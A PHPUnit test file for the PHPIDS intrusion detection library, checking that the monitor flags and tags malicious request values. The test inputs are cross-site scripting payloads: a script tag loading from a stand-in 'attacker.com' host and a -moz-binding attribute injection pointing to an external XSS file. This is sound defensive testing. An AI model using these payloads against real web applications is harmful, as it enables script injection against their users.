<?php
	require_once 'PHPUnit2/Framework/TestCase.php';
	require_once dirname(__FILE__) . '/../../../phpids/ids.php';
	require_once dirname(__FILE__) . '/../../../phpids/storage.php';
	
	class IDS_Monitor_TestCase extends PHPUnit_Framework_TestCase {

		public function setUp()
		{
			$this->storage = new IDS_Filter_Storage();
			$this->storage->getFilterFromXML(dirname(__FILE__) . '/../../../phpids/default_filter.xml');
		}

		public function testRunWithTags() {
			$test = new IDS_Monitor(
				array('user' => 'admin<script/src=http/attacker.com>'),
				$this->storage,
				array('csrf')				
			);
			
			$result = $test->run();

			foreach ($result->getEvent('user')->getFilters() as $filter) {
				$this->assertTrue(in_array('csrf', $filter->getTags()));
			}
		}
	
		public function testRun() {
			$test = new IDS_Monitor(
				array(
					'id' 	=> '9<script/src=http/attacker.com>',
					'name' 	=> '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
				),
				$this->storage
			);
			
			$result = $test->run();
			
			$this->assertTrue($result->hasEvent('id'));
			$this->assertTrue($result->hasEvent('name'));
		}

		public function testList()
		{
			$test = new IDS_Monitor(
				array('9<script/src=http/attacker.com>', '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'),
				$this->storage
			);
			$result = $test->run();
			$this->assertTrue($result->hasEvent(1));
			$this->assertEquals(6, $result->getImpact());
		}
	
	}
